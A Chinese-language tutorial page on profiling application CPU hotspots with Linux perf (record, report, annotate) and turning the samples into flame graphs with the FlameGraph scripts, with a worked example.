例：比如你写了一个应用，但是运行起来发现CPU使用率高，运行慢。一个新手可能会猜测哪一部分的代码有问题，或者花费大量的时间去静态分析代码。经验告诉我们这种做法非常低效！例：对于运维人员，研发最近修改了部分代码上线后，CPU使用率突增，查看所有应用源码这对运维人员来说显然工作量巨大且不现实 通过perf，你可以不需要修改代码，仅仅进行几次采样就可以快速找到任意内核，任意应用程序的性能热点，并且可以利用flame graph 生成火焰图 perf采样理念诞生于2009年，采样这个方式在现分布式系统中也特别常见，比如我们会对整个分布式系统的所有调用链的响应情况做采样，以此为全链路监控提供数据支撑，以此来判断全局RT Perf体验--开启零侵入式应用分析 性能记录采样 采样后会在当前目录下生成一个perf.data文件， Ctrl+C终止采样 启动./test应用，并开始性能采样perf record -F 999 ./test 针对所有进程进行采样(-g可以生成火焰图)perf record -g -a 对正在运行的应用怎么办？可以指定的Pid进程采样 perf record -g -p 分析采样文件输出性能报告（能定位到具体的函数） 默认根据当前目录下的perf.data输出报告 perf report 输出结果： Overhead：指出了该Symbol采样在总采样中所占的百分比。在当前场景下，表示了该Symbol消耗的CPU时间占总CPU时间的百分比 Command：进程名 Shared Object：模块名， 比如具体哪个共享库，哪个可执行程序。 Symbol：二进制模块中的符号名，如果是高级语言，比如C语言编写的程序，等价于函数名。 附加: 输出性能报告（定位到具体行） perf annotate --stdio --symbol=main.chFunc 生成火焰图 命令git仓库：https://github.com/brendangregg/FlameGraph/1.用perf script工具对perf.data进行解析perf script -i perf.data &> perf.unfold2.将perf.unfold中的符号进行折叠./stackcollapse-perf.pl perf.unfold &> perf.folded3.最后生成svg图：./flamegraph.pl perf.folded > perf.svg 操作样例 test测试程序下载地址: https://itgod.org/book/test 1.获得在运行的进程PID 2.开始采样perf record -g -p 根据采样数据分析性能热点perf report 图中可以看出88%的性能开销来自main.Fun3函数，10%的性能损耗来自Main.fun1函数输出结果： Overhead：指出了该Symbol采样在总采样中所占的百分比。在当前场景下，表示了该Symbol消耗的CPU时间占总CPU时间的百分比 Command：进程名 Shared Object：模块名， 比如具体哪个共享库，哪个可执行程序。 Symbol：二进制模块中的符号名，如果是高级语言，比如C语言编写的程序，等价于函数名。 分析函数中代码性能 我们光标移动到main.func3处，按回车会出现如下内容，然后再按回车 出现了具体的函数内容，内容是通过反汇编方式展示。这里可以看着我们99%的性能损耗来自for循环 附加：生成火焰图 1.用perf script工具对perf.data进行解析 `perf script -i perf.data &> perf.unfold` 2.将perf.unfold中的符号进行折叠 `./stackcollapse-perf.pl perf.unfold &> perf.folded` 3.最后生成svg图： `./flamegraph.pl perf.folded > perf.svg` Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 03:46:43 "}}